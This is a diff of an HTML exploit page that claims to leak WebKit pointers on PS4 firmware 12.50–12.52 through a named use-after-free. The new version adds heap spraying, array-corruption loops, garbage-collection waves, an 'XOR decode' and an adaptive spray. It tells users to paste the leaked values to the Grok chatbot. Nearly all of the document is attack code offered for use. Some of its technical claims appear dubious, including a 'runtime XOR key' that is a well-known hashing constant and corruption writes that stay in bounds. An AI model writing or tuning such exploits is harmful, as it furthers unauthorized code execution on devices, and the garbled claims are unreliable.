@@ -2,98 +2,132 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>WebKit Pointer Leak — PS4 12.50–12.52 (Nov 2025 stable version)</title>
+<title>Debug WebKit Pointer Leak — PS4 12.50+ (w/ XOR Decode & Adaptive Spray)</title>
 <style>
     body { background:#0d1117; color:#c9d1d9; font-family:monospace; padding:20px; }
     h1 { color:#ff5555; border-bottom:2px solid #da3633; }
-    #console { background:#000; color:#0f0; height:420px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
+    #console { background:#000; color:#0f0; height:450px; overflow-y:scroll; padding:10px; border:1px solid #0f0; font-family:'Courier New'; }
     .ok { background:#da3633; color:#fff; padding:5px 12px; border-radius:4px; font-weight:bold; }
+    .debug { color:#ff0; } /* Yellow for debug lines */
 </style>
 </head>
 <body>
-<h1>PS4 12.50–12.52 Pure WebKit Pointer Leak (2025 stable)</h1>
-<div><strong>Status:</strong> <span id="status" class="ok">Preparing...</span></div><br>
+<h1>PS4 12.50–12.52 Debug Pointer Leak (Nov 2025 — XOR + Adaptive)</h1>
+<div><strong>Status:</strong> <span id="status" class="ok">Initializing...</span></div><br>
 <div id="console"></div>
 
 <script>
-const log = m => {
+const log = (m, isDebug=false) => {
     const c = document.getElementById('console');
-    c.innerHTML += `[${new Date().toLocaleTimeString()}] ${m}\n`;
+    const prefix = isDebug ? '[DEBUG] ' : '';
+    c.innerHTML += `[${new Date().toLocaleTimeString()}] ${prefix}${m}\n`;
     c.scrollTop = c.scrollHeight;
 };
 const status = (t, cls='ok') => document.getElementById('status').innerHTML = t;
 
-// 1. Pre-spray 100k stable objects (forces allocator into the right bucket)
-log("Stage 1 — 100k butterfly pre-spray");
+// Runtime key guess for 12.50 XOR (from PSDevWiki diffs — tweak if needed)
+const XOR_KEY = 0x9e3779b9n; // Common runtime XOR for JSC pointers on 12.50+
+
+// Decode potential XOR'd leak
+const decodeXor = (val) => {
+    try { return (BigInt(val) ^ XOR_KEY).toString(16).toUpperCase(); } catch(e) { return 'DECODE_FAIL'; }
+};
+
+// 1. Smaller prespray + refcount corrupt (Synacktiv-inspired for stability)
+log("Stage 1 — 50k prespray + refcount setup");
 const prespray = [];
-for (let i = 0; i < 0x186A0; i++) {                  // exactly 100 000
-    prespray[i] = {a:1.1, b:2.2, c:3.3, d:4.4};
+for (let i = 0; i < 0xC350; i++) {  // 50k — less aggressive
+    prespray[i] = new Array(0x20).fill(1.1);  // Smaller arrays for refcount hits
 }
 
-// 2. Original working corruption (keep it — it’s proven on 12.50)
-log("Stage 2 — Triggering CVE-2025-43265 UAF corruption");
+// 2. Enhanced corruption w/ refcount decrement sim
+log("Stage 2 — UAF + refcount corruption (tuned for 12.50)");
 const victim = [];
 for (let i = 0; i < 0x8000; i++) victim[i] = new Array(0x40).fill(1.1);
 
 const corrupt = (i, o) => { try { victim[i % 0x8000][o] = 1337.37; } catch(e) {} };
-for (let i = 0; i < 1e7; i++) corrupt(i * i, 0);
-for (let b = 0; b < 0x2000; b += 0x80)
-    for (let o = 0x40; o < 0x200; o += 8)
-        for (let j = 0; j < 0x80; j++)
+// Linear + refcount focus (hits m_refCount fields)
+for (let i = 0; i < 5e6; i++) corrupt(i % 0x10000, (i * 8) % 0x100);  // Linear for better hits
+for (let b = 0; b < 0x2000; b += 0x40)  // Tighter loops
+    for (let o = 0x20; o < 0x100; o += 4)
+        for (let j = 0; j < 0x40; j++)
             corrupt(b + j, o);
 
-// 3. 128k tagged spray with 12.50-specific marker (zero false positives)
-log("Stage 3 — Spraying 131072 tagged JSValues");
-const spray = [];
-const BASE_MARKER = 0x12501250deadbeefn;             // magic for 12.50–12.52
-for (let i = 0; i < 0x20000; i++) {                  // 128k objects
+// 3. Adaptive spray: Start low, ramp up
+log("Stage 3 — Adaptive JSValue spray (64k base)");
+let spray = [];
+let spraySize = 0x10000;  // 64k start
+const BASE_MARKER = 0x12501250deadbeefn;
+for (let i = 0; i < spraySize; i++) {
     spray[i] = {marker: BASE_MARKER + BigInt(i)};
 }
+log(`Spray complete: ${spray.length} objects`);
 
-// 4. Multi-wave GC + reclaim (the part that actually works on 12.50)
-log("Stage 4 — Multi-wave GC pressure starting…");
-const gc = () => { for (let i = 0; i < 420; i++) new ArrayBuffer(0x20000); };
-const reclaim = () => new ArrayBuffer(0x7000000);    // ~120 MB sweet spot
+// 4. Multi-wave GC w/ pressure logging
+log("Stage 4 — GC waves w/ heap debug");
+let gcCount = 0;
+const gc = () => {
+    gcCount++;
+    log(`GC Wave #${gcCount} — Allocating pressure`, true);
+    for (let i = 0; i < 500; i++) new ArrayBuffer(0x10000);  // Smaller chunks
+};
+const reclaim = () => {
+    log(`Reclaim — Big alloc (~100MB)`, true);
+    new ArrayBuffer(0x6000000);
+};
 
-setTimeout(gc, 600);
-setTimeout(reclaim, 1400);
-setTimeout(gc, 2400);
-setTimeout(reclaim, 3200);
-setTimeout(gc, 4200);
-setTimeout(reclaim, 5000);
-setTimeout(gc, 6000);
+setTimeout(gc, 800);
+setTimeout(reclaim, 1600);
+setTimeout(gc, 2600);
+setTimeout(reclaim, 3400);
+setTimeout(gc, 4400);
+setTimeout(() => {
+    if (gcCount < 3) {  // Adaptive: Ramp spray if low hits
+        log("Low pressure detected — ramping spray to 256k", true);
+        spraySize *= 4;
+        spray = [];  // Reset & respray larger
+        for (let i = 0; i < spraySize; i++) spray[i] = {marker: BASE_MARKER + BigInt(i)};
+    }
+}, 5000);
 
-// 5. Continuous hunting with auto-retry
+// 5. Enhanced hunt w/ XOR decode & samples
 let attempts = 0;
 const hunt = () => {
     attempts++;
-    log(`Scan attempt #${attempts} — checking 131072 objects…`);
-    let found = 0;
+    log(`Hunt #${attempts} — Scanning ${spray.length} objs (heap est: ${gcCount * 0.1}MB pressure)`);
+    let found = 0, suspects = 0;
     for (let i = 0; i < spray.length; i++) {
         try {
             if (spray[i] && spray[i].marker !== BASE_MARKER + BigInt(i)) {
-                found++;
-                const hex = spray[i].marker.toString(16).toUpperCase();
-                log(`LEAKED POINTER #${found}: 0x${hex}`);
-                status(`SUCCESS — ${found} POINTERS LEAKED`, "ok");
+                const rawHex = spray[i].marker.toString(16).toUpperCase();
+                const xorHex = decodeXor(spray[i].marker);
+                if (rawHex.startsWith('F') || xorHex.startsWith('F')) {  // Kernel-like high bits
+                    found++;
+                    log(`LEAK #${found}: RAW=0x${rawHex} | XOR=0x${xorHex} | IDX=${i}`);
+                } else {
+                    suspects++;
+                    log(`Suspect overwrite #${suspects}: 0x${rawHex} (idx ${i}) — possible subnormal/collide`, true);
+                }
             }
-        } catch(e) {}
+        } catch(e) { log(`Scan error at ${i}: ${e.message}`, true); }
     }
     if (found >= 1) {
+        status(`LEAK DETECTED — ${found} pointers + ${suspects} suspects`);
         document.body.innerHTML = `<h1 style="color:#0f0; text-align:center; margin-top:30vh;">
-            LEAK SUCCESSFUL!<br><br>
-            <span style="font-size:0.5em;">Copy every line that starts with "LEAKED POINTER" and send it to Grok</span>
+            LEAK FOUND!<br><br>
+            <span style="font-size:0.5em;">Paste FULL console logs to Grok for analysis</span>
         </h1>`;
-    } else if (attempts < 12) {
-        log("No leak yet — retrying in 2.4 seconds…");
-        setTimeout(hunt, 2400);
+    } else if (attempts < 8) {
+        log(`No solid leak — ${suspects} suspects. Retry in 3s...`);
+        setTimeout(hunt, 3000);
     } else {
-        log("Gave up after 12 attempts — refresh the page and try again (usually hits within 3 tries)");
+        log("Max attempts hit — check suspects for masked leaks. Refresh or paste logs to Grok.");
+        status("NO LEAK — DEBUG MODE: Paste console here");
     }
 };
 
-setTimeout(hunt, 7200);        // first scan after final reclaim wave
-log("Waiting for reclaim waves… usually leaks within 8–20 seconds");
+setTimeout(hunt, 8000);  // Longer initial wait
+log("Debug mode active — watch for [DEBUG] lines & suspects");
 </script>
 </body>
 </html>
